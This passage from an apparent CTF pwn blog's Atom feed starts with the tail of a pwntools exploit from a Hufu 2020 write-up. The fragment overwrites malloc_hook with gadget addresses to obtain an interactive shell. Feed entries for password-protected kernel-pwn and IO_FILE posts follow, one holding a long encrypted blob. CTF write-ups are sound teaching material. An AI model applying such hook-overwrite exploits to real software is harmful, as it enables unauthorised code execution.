class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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